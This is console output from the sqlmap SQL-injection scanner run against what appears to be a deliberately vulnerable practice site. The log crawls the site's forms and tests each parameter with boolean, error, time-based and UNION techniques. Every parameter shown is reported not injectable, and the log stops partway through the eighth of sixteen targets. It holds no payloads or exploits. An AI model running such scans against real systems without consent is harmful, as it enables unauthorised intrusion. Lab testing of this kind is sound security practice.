        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.3#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:40:18 /2024-05-14/

do you want to check for the existence of site's sitemap(.xml) [y/N] N
[10:40:18] [INFO] starting crawler for target URL 'https://pentest-ground.com:4280'
[10:40:18] [INFO] searching for links with depth 1
[10:40:19] [INFO] searching for links with depth 2
please enter number of threads? [Enter for 1 (current)] 1
[10:40:19] [WARNING] running in a single-thread mode. This could take a while
got a 302 redirect to 'https://pentest-ground.com:4280/login.php'. Do you want to follow? [Y/n] Y
[10:40:29] [WARNING] potential CAPTCHA protection mechanism detected
do you want to normalize crawling results [Y/n] Y
do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
[10:40:35] [INFO] found a total of 16 targets
[1/16] Form:
POST https://pentest-ground.com:4280/vulnerabilities/xss_s/
POST data: txtName=&mtxMessage=&btnSign=Sign%20Guestbook
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: txtName=&mtxMessage=&btnSign=Sign%20Guestbook] (Warning: blank fields detected): txtName=&mtxMessage=&btnSign=Sign Guestbook
do you want to fill blank fields with random values? [Y/n] Y
[10:40:35] [INFO] using '/Users/mahdihussnie/.local/share/sqlmap/output/results-05142024_1040am.csv' as the CSV results file in multiple targets mode
you have not declared cookie(s), while server wants to set its own ('security=low;PHPSESSID=accd6d19f47...128f8f4940'). Do you want to use those [Y/n] Y
[10:40:35] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:40:36] [INFO] testing if the target URL content is stable
[10:40:37] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
[10:40:37] [INFO] testing if POST parameter 'txtName' is dynamic
[10:40:37] [INFO] POST parameter 'txtName' appears to be dynamic
[10:40:38] [WARNING] heuristic (basic) test shows that POST parameter 'txtName' might not be injectable
[10:40:38] [INFO] heuristic (XSS) test shows that POST parameter 'txtName' might be vulnerable to cross-site scripting (XSS) attacks
[10:40:38] [INFO] testing for SQL injection on POST parameter 'txtName'
[10:40:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:40:39] [WARNING] reflective value(s) found and filtering out
[10:40:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:40:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:40:47] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:40:49] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:40:52] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:40:55] [INFO] testing 'Generic inline queries'
[10:40:56] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:40:58] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:41:00] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:41:02] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:41:04] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:41:06] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:41:09] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[10:41:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:41:14] [WARNING] POST parameter 'txtName' does not seem to be injectable
[10:41:14] [INFO] testing if POST parameter 'mtxMessage' is dynamic
[10:41:14] [INFO] POST parameter 'mtxMessage' appears to be dynamic
[10:41:15] [WARNING] heuristic (basic) test shows that POST parameter 'mtxMessage' might not be injectable
[10:41:15] [INFO] heuristic (XSS) test shows that POST parameter 'mtxMessage' might be vulnerable to cross-site scripting (XSS) attacks
[10:41:15] [INFO] testing for SQL injection on POST parameter 'mtxMessage'
[10:41:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:41:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:41:21] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:41:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:41:26] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:41:29] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:41:31] [INFO] testing 'Generic inline queries'
[10:41:32] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:41:34] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:41:36] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:41:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:41:40] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:41:45] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:41:47] [INFO] testing 'Oracle AND time-based blind'
[10:41:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:41:53] [WARNING] POST parameter 'mtxMessage' does not seem to be injectable
[10:41:53] [INFO] testing if POST parameter 'btnSign' is dynamic
[10:41:54] [INFO] POST parameter 'btnSign' appears to be dynamic
[10:41:54] [WARNING] heuristic (basic) test shows that POST parameter 'btnSign' might not be injectable
[10:41:55] [INFO] testing for SQL injection on POST parameter 'btnSign'
[10:41:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:42:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:42:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:42:03] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:42:06] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:42:09] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:42:12] [INFO] testing 'Generic inline queries'
[10:42:13] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:42:15] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:42:17] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:42:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:42:21] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:42:24] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:42:26] [INFO] testing 'Oracle AND time-based blind'
[10:42:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:42:31] [WARNING] POST parameter 'btnSign' does not seem to be injectable
[10:42:31] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[2/16] Form:
POST https://pentest-ground.com:4280/vulnerabilities/exec/
POST data: ip=&Submit=Submit
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: ip=&Submit=Submit] (Warning: blank fields detected): ip=&Submit=Submit
do you want to fill blank fields with random values? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('security=low;PHPSESSID=d16a1665ed0...dbc9258e39'). Do you want to use those [Y/n] Y
[10:42:32] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:42:33] [INFO] testing if the target URL content is stable
[10:42:33] [INFO] target URL content is stable
[10:42:33] [INFO] testing if POST parameter 'ip' is dynamic
[10:42:38] [CRITICAL] unable to connect to the target URL (504 - Gateway Timeout). sqlmap is going to retry the request
[10:42:42] [CRITICAL] unable to connect to the target URL (504 - Gateway Timeout). sqlmap is going to retry the request
[10:42:47] [CRITICAL] unable to connect to the target URL (504 - Gateway Timeout). sqlmap is going to retry the request
[10:42:51] [WARNING] POST parameter 'ip' does not appear to be dynamic
[10:42:56] [CRITICAL] unable to connect to the target URL (504 - Gateway Timeout). sqlmap is going to retry the request
[10:43:00] [CRITICAL] unable to connect to the target URL (504 - Gateway Timeout). sqlmap is going to retry the request
[10:43:05] [CRITICAL] unable to connect to the target URL (504 - Gateway Timeout). sqlmap is going to retry the request
[10:43:09] [ERROR] unable to connect to the target URL (504 - Gateway Timeout), skipping to the next target
[10:43:09] [WARNING] HTTP error codes detected during run:
504 (Gateway Timeout) - 8 times
[3/16] Form:
GET https://pentest-ground.com:4280/vulnerabilities/sqli_blind/?id=&Submit=Submit
do you want to test this form? [Y/n/q] 
> Y
Edit GET data [default: id=&Submit=Submit]: id=&Submit=Submit
do you want to fill blank fields with random values? [Y/n] Y
[10:43:10] [CRITICAL] page not found (404)
[10:43:10] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 1 times
[4/16] Form:
POST https://pentest-ground.com:4280/login.php
POST data: username=&password=&Login=Login&user_token=54c9218c2e056ff86bec42be3b1f1d8c
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: username=&password=&Login=Login&user_token=54c9218c2e056ff86bec42be3b1f1d8c] (Warning: blank fields detected): username=&password=&Login=Login&user_token=54c9218c2e056ff86bec42be3b1f1d8c
do you want to fill blank fields with random values? [Y/n] Y
POST parameter 'user_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
got a 302 redirect to 'https://pentest-ground.com:4280/login.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('security=low;PHPSESSID=f5a51d267cd...09750bb81d'). Do you want to use those [Y/n] Y
[10:43:12] [INFO] testing if the target URL content is stable
[10:43:15] [WARNING] POST parameter 'username' does not appear to be dynamic
[10:43:17] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[10:43:20] [INFO] testing for SQL injection on POST parameter 'username'
[10:43:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:43:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:43:34] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:43:48] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:44:00] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:44:13] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:44:26] [INFO] testing 'Generic inline queries'
[10:44:29] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:44:29] [WARNING] time-based comparison requires larger statistical model, please wait. (done)
[10:44:42] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:44:53] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:45:03] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:45:15] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:45:27] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:45:38] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[10:46:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:46:34] [WARNING] POST parameter 'username' does not seem to be injectable
[10:46:34] [WARNING] POST parameter 'password' does not appear to be dynamic
[10:46:36] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[10:46:38] [INFO] testing for SQL injection on POST parameter 'password'
[10:46:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:46:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:46:52] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:47:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:47:17] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:47:29] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:47:41] [INFO] testing 'Generic inline queries'
[10:47:43] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:47:53] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:48:03] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:48:14] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:48:27] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:48:39] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:48:51] [INFO] testing 'Oracle AND time-based blind'
[10:49:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:49:27] [WARNING] POST parameter 'password' does not seem to be injectable
[10:49:27] [WARNING] POST parameter 'Login' does not appear to be dynamic
[10:49:29] [WARNING] heuristic (basic) test shows that POST parameter 'Login' might not be injectable
[10:49:32] [INFO] testing for SQL injection on POST parameter 'Login'
[10:49:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:49:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:49:47] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:50:01] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:50:16] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:50:29] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:50:40] [INFO] testing 'Generic inline queries'
[10:50:43] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:50:54] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:51:04] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:51:14] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:51:26] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:51:40] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:51:54] [INFO] testing 'Oracle AND time-based blind'
[10:52:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:52:32] [WARNING] POST parameter 'Login' does not seem to be injectable
[10:52:32] [INFO] ignoring POST parameter 'user_token'
[10:52:32] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[5/16] Form:
POST https://pentest-ground.com:4280/security.php
POST data: security=low&seclev_submit=Submit&user_token=1a1241f79f05c83199541ea7de2479cd
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: security=low&seclev_submit=Submit&user_token=1a1241f79f05c83199541ea7de2479cd]: security=low&seclev_submit=Submit&user_token=1a1241f79f05c83199541ea7de2479cd
POST parameter 'user_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
you have not declared cookie(s), while server wants to set its own ('security=low;PHPSESSID=42ca1376f2a...b3334eed9c'). Do you want to use those [Y/n] Y
[10:52:32] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:52:33] [INFO] testing if the target URL content is stable
[10:52:33] [INFO] target URL content is stable
[10:52:33] [INFO] testing if POST parameter 'security' is dynamic
[10:52:34] [WARNING] POST parameter 'security' does not appear to be dynamic
[10:52:34] [WARNING] heuristic (basic) test shows that POST parameter 'security' might not be injectable
[10:52:34] [INFO] testing for SQL injection on POST parameter 'security'
[10:52:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:52:37] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:52:37] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:52:40] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:52:42] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:52:44] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:52:47] [INFO] testing 'Generic inline queries'
[10:52:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:52:49] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:52:51] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:52:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:52:57] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:52:59] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:53:02] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[10:53:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:53:10] [WARNING] POST parameter 'security' does not seem to be injectable
[10:53:10] [INFO] testing if POST parameter 'seclev_submit' is dynamic
[10:53:10] [WARNING] POST parameter 'seclev_submit' does not appear to be dynamic
[10:53:11] [WARNING] heuristic (basic) test shows that POST parameter 'seclev_submit' might not be injectable
[10:53:11] [INFO] testing for SQL injection on POST parameter 'seclev_submit'
[10:53:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:53:14] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:53:15] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:53:17] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:53:20] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:53:22] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:53:25] [INFO] testing 'Generic inline queries'
[10:53:25] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:53:27] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:53:29] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:53:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:53:34] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:53:37] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:53:39] [INFO] testing 'Oracle AND time-based blind'
[10:53:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:53:48] [WARNING] POST parameter 'seclev_submit' does not seem to be injectable
[10:53:48] [INFO] ignoring POST parameter 'user_token'
[10:53:48] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[6/16] Form:
GET https://pentest-ground.com:4280/vulnerabilities/xss_r/?name=
do you want to test this form? [Y/n/q] 
> Y
Edit GET data [default: name=]: name=
do you want to fill blank fields with random values? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('security=low;PHPSESSID=116dbaf787b...0bcbad4700'). Do you want to use those [Y/n] Y
[10:53:49] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:53:49] [INFO] testing if the target URL content is stable
[10:53:50] [INFO] target URL content is stable
[10:53:50] [INFO] testing if GET parameter 'name' is dynamic
[10:53:50] [WARNING] GET parameter 'name' does not appear to be dynamic
[10:53:51] [WARNING] heuristic (basic) test shows that GET parameter 'name' might not be injectable
[10:53:52] [INFO] heuristic (XSS) test shows that GET parameter 'name' might be vulnerable to cross-site scripting (XSS) attacks
[10:53:52] [INFO] testing for SQL injection on GET parameter 'name'
[10:53:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:53:52] [WARNING] reflective value(s) found and filtering out
[10:53:58] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:53:59] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:54:01] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:54:04] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:54:06] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:54:09] [INFO] testing 'Generic inline queries'
[10:54:10] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:54:12] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:54:14] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:54:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:54:19] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:54:21] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:54:24] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[10:54:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:54:33] [WARNING] GET parameter 'name' does not seem to be injectable
[10:54:33] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[7/16] Form:
GET https://pentest-ground.com:4280/vulnerabilities/csrf/?password_new=&password_conf=&Change=Change
do you want to test this form? [Y/n/q] 
> Y
Edit GET data [default: password_new=&password_conf=&Change=Change]: password_new=&password_conf=&Change=Change
do you want to fill blank fields with random values? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('security=low;PHPSESSID=6c76ca8ba37...b047010c20'). Do you want to use those [Y/n] Y
[10:54:33] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:54:34] [INFO] testing if the target URL content is stable
[10:54:35] [INFO] target URL content is stable
[10:54:35] [INFO] testing if GET parameter 'password_new' is dynamic
[10:54:35] [WARNING] GET parameter 'password_new' does not appear to be dynamic
[10:54:36] [WARNING] heuristic (basic) test shows that GET parameter 'password_new' might not be injectable
[10:54:36] [INFO] testing for SQL injection on GET parameter 'password_new'
[10:54:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:54:39] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:54:40] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:54:42] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:54:45] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:54:47] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:54:50] [INFO] testing 'Generic inline queries'
[10:54:50] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:54:52] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:54:55] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:54:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:55:00] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:55:02] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:55:05] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[10:55:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:55:13] [WARNING] GET parameter 'password_new' does not seem to be injectable
[10:55:13] [INFO] testing if GET parameter 'password_conf' is dynamic
[10:55:14] [WARNING] GET parameter 'password_conf' does not appear to be dynamic
[10:55:14] [WARNING] heuristic (basic) test shows that GET parameter 'password_conf' might not be injectable
[10:55:15] [INFO] testing for SQL injection on GET parameter 'password_conf'
[10:55:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:55:17] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:55:17] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:55:20] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:55:22] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:55:25] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:55:27] [INFO] testing 'Generic inline queries'
[10:55:28] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:55:30] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:55:32] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:55:33] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:55:36] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:55:38] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:55:40] [INFO] testing 'Oracle AND time-based blind'
[10:55:43] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:55:48] [WARNING] GET parameter 'password_conf' does not seem to be injectable
[10:55:48] [INFO] testing if GET parameter 'Change' is dynamic
[10:55:48] [WARNING] GET parameter 'Change' does not appear to be dynamic
[10:55:49] [WARNING] heuristic (basic) test shows that GET parameter 'Change' might not be injectable
[10:55:49] [INFO] testing for SQL injection on GET parameter 'Change'
[10:55:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:55:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:55:52] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:55:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:55:57] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:55:59] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:56:02] [INFO] testing 'Generic inline queries'
[10:56:02] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:56:04] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:56:06] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:56:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:56:11] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:56:13] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:56:15] [INFO] testing 'Oracle AND time-based blind'
[10:56:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:56:25] [WARNING] GET parameter 'Change' does not seem to be injectable
[10:56:25] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[8/16] Form:
POST https://pentest-ground.com:4280/vulnerabilities/captcha/
POST data: step=1&password_new=&password_conf=&Change=Change
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: step=1&password_new=&password_conf=&Change=Change] (Warning: blank fields detected): step=1&password_new=&password_conf=&Change=Change
do you want to fill blank fields with random values? [Y/n] Y
[10:56:26] [WARNING] potential CAPTCHA protection mechanism detected
you have not declared cookie(s), while server wants to set its own ('security=low;PHPSESSID=f3cdcae364c...3ecbd11a8c'). Do you want to use those [Y/n] Y
[10:56:26] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:56:26] [INFO] testing if the target URL content is stable
[10:56:27] [INFO] target URL content is stable
[10:56:27] [INFO] testing if POST parameter 'step' is dynamic
[10:56:28] [INFO] POST parameter 'step' appears to be dynamic
[10:56:29] [WARNING] heuristic (basic) test shows that POST parameter 'step' might not be injectable
[10:56:30] [INFO] testing for SQL injection on POST parameter 'step'
[10:56:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:56:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
